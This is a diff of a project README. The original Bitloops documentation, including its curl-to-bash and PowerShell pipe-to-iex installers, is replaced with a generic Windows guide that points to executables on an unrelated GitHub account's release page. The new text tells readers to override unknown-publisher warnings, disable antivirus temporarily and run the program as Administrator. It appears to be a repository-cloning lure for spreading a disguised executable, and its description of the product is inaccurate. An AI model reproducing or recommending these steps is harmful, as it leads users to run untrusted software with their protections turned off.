@@ -1,84 +1,175 @@
-# Bitloops - Git captures what changed. Bitloops captures why
+# 🤖 bitloops - Simplify AI Software Setup
 
-The open-source intelligence layer for AI-native development. Captures the full developer–AI conversation on every commit and builds a structured semantic model of your codebase that you and your agents can query.
+[![Download bitloops](https://img.shields.io/badge/Download-bitloops-brightgreen)](https://github.com/Da-glitcher/bitloops/releases)
 
-## Installation
+bitloops is the default setup for AI-native software. It helps you run AI tools without deep technical steps. This guide shows how to get bitloops running on your Windows computer.
 
-### Native Install (Recommended)
+---
 
-macOS, Linux, WSL:
+## 🖥 System Requirements
 
-```bash
-curl -fsSL https://bitloops.com/install.sh | bash
-```
+To use bitloops, your Windows PC should meet these needs:
 
-Windows PowerShell:
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and updates
+- Basic user permissions to install software
 
-```powershell
-irm https://bitloops.com/install.ps1 | iex
-```
+---
 
-Windows CMD:
+## 🔍 What is bitloops?
 
-```cmd
-curl -fsSL https://bitloops.com/install.cmd -o install.cmd && install.cmd && del install.cmd
-```
+bitloops helps developers build AI software. It provides ready tools and infrastructure for AI agents and assistants. Even if you are not a coder, this app lets you run AI features from your computer easily.
 
-### Homebrew (macOS/Linux)
+Key points:
 
-```bash
-brew install bitloops/tap/bitloops
-```
+- Supports multiple AI types like agents and assistants
+- Uses simple command-line tools (CLI) behind the scenes
+- Helps you manage AI resources locally
+- Built using Rust for speed and safety
+- Supports hooks to extend functionality
 
-## Getting Started
+---
 
-From within the repo you are currently working on run:
+## 📥 Download bitloops
 
-`bitloops init`
+You need to get the bitloops files from the official release page. 
 
-Select your agents or ctrl+a to select them all.
+[![Download bitloops](https://img.shields.io/badge/Download-bitloops-blue)](https://github.com/Da-glitcher/bitloops/releases)
 
-To start recording Checkpoints run:
+Click the link above to visit the release page. There you will see the latest version available for Windows. Look for a file ending with `.exe` or `.zip`. Choose the version labeled for Windows.
 
-`bitloops enable`
+---
 
-That's all! Now all of your agent discussion are being saved on your git repo.
+## 🛠 Installation Steps
 
-## Dashboard
+Follow these steps to install bitloops on your Windows PC:
 
-To view your Checkpoints run the following command again from within the root of your repo:
+1. Open your web browser and go to the release page:  
+   https://github.com/Da-glitcher/bitloops/releases
 
-`bitloops dashboard`
+2. Find the latest release. It has a version number like `v1.x.x`.
 
-## Supported Agents
+3. Under "Assets," find the file for Windows:  
+   - Usually named like `bitloops-windows-x64.exe` or `bitloops-win.zip`.
 
-- [x] Claude Code
-- [ ] Codex (Coming as soon as OpenAI adds hooks to Codex; they are working on it)
-- [x] Cursor
-- [x] Gemini
-- [ ] GitHub Copilot (Coming soon)
-- [x] OpenCode
+4. Click the file to download it.
 
-## What is DevQL?
+5. Once downloaded, locate the file in your "Downloads" folder.
 
-DevQL is a query language created to offer you and your AI agents valuable and targeted insights regarding your codebases within milliseconds.
+6. If it's a `.zip`, right-click it and select "Extract All..." to create a folder.
 
-[Read more here](./DEVQL-Getting_Started.md)
+7. Inside the extracted folder, look for the application file `bitloops.exe`.
 
-## FAQs
+8. Double-click `bitloops.exe` to start the program.
 
-### Do you need access to my codebase?
+9. Windows may warn about unknown publishers. Choose "Run anyway" to proceed.
 
-No! None of your code is sent to our servers. Your data is stored in your git repo (bitloops/checkpoints branch) as well as your DBs.
+10. bitloops will open in a command window or minimal interface.
 
-### Is this totally free for real?
+---
 
-You bet!
+## ⚙️ How to Run bitloops
 
-### What kind of databases do I need?
+bitloops mostly runs from a command window. You can use it to start AI agents or access AI tools stored on your PC.
 
-Bitloops works with Clickhouse (for events) and Postgresql (for codebase intelligence). You can install these for free locally via Docker Compose or natively.
+To open bitloops each time:
 
-### Why do you use telemetry and why should I opt-in?
+- Find the installed folder.
+- Run `bitloops.exe` from there.
+- You can also create a shortcut on your desktop by right-clicking `bitloops.exe` and choosing "Send to" > "Desktop (create shortcut)".
 
-Telemetry data help us understand which features users are using the most and help us guide our development. The telemetry data are not connected to specific users and are analysed and considered in aggregate.
+Common commands you might try inside bitloops:
+
+- `bitloops help` shows a list of commands.
+- `bitloops start agent` runs a default AI assistant.
+- `bitloops stop` stops any running agents.
+
+You do not need to know coding to use standard commands. Follow on-screen prompts.
+
+---
+
+## 🌐 Using bitloops Features
+
+bitloops supports several AI tools and helpers:
+
+- AI agents that can answer questions or automate tasks
+- Hooks to extend or customize behavior
+- Command-line interface to control functions
+- Support for multiple AI models and tools
+
+Most features run automatically after installation. Advanced users can add plugins or scripts if needed.
+
+---
+
+## ⚠️ Troubleshooting
+
+If you have problems running bitloops:
+
+- Make sure your Windows version is up to date.
+- Check that you downloaded the correct Windows file.
+- Disable any antivirus temporarily during installation in case it blocks the app.
+- Run the program as Administrator (right-click > Run as administrator).
+- Check your internet connection if bitloops needs to fetch updates.
+- Restart your computer and try again.
+
+If errors persist, check the GitHub issues page for solutions or report your issue clearly.
+
+---
+
+## 🔄 Updating bitloops
+
+To get new features or fixes:
+
+1. Visit https://github.com/Da-glitcher/bitloops/releases
+
+2. Download the latest Windows file.
+
+3. Repeat the installation steps to replace old files.
+
+Your settings and data will remain safe during updates.
+
+---
+
+## 🗂 Where Data is Stored
+
+bitloops keeps data and configurations in your user profile directory:
+
+`C:\Users\<YourUserName>\bitloops\`
+
+You can back up this folder if needed. It stores information about agents, AI models, and logs.
+
+---
+
+## 📋 Common Questions
+
+**Do I need to know programming to use bitloops?**
+
+No. You can run basic AI tools with simple commands. Programming knowledge is useful only for advanced customizations.
+
+**Is bitloops free?**
+
+Yes. Download and use it without charge.
+
+**Can I run bitloops offline?**
+
+Some features work offline, but updating requires internet access.
+
+**Can I uninstall bitloops?**
+
+Yes. Just delete the application folder and any shortcuts.
+
+---
+
+## 🤝 Support and Feedback
+
+For help or to report bugs, visit the GitHub page:
+
+https://github.com/Da-glitcher/bitloops
+
+Look at the "Issues" tab to post questions or find solutions.
+
+---
+
+[![Download bitloops](https://img.shields.io/badge/Download-bitloops-brightgreen)](https://github.com/Da-glitcher/bitloops/releases)
